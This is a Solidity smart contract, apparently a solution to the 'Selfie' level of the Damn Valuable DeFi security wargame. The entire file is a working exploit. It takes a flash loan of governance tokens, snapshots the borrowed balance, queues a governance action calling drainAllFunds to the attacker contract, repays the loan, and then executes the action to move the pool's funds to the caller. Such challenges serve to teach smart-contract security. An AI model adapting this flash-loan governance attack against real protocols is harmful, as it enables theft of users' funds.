// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackerProxyGovernance {

    SelfiePool pool;
    DamnValuableTokenSnapshot public immutable governanceToken;
    SimpleGovernance public immutable governance;

    uint256 actionIndex;

    constructor(address poolAddress, address governanceTokenAddress, address governanceAddress) {
        pool = SelfiePool(poolAddress);
        governanceToken = DamnValuableTokenSnapshot(governanceTokenAddress);
        governance = SimpleGovernance(governanceAddress);
    }

    function receiveTokens(address token, uint256 amount) external {
        //take snapshot with loaned balance
        governanceToken.snapshot();
        // make evil proposal with loaned tokens
        actionIndex = governance.queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)", address(this)), 0);
        // return funds
        governanceToken.transfer(address(pool), governanceToken.balanceOf(address(this)));
    }

    function evilProposal() external {
        // loan tokens
        pool.flashLoan(governanceToken.balanceOf(address(pool)));
    }

    function drainPool() external {
        // make evil proposal with loaned tokens
        governance.executeAction(actionIndex);
        governanceToken.transfer(msg.sender, governanceToken.balanceOf(address(this)));
    }

}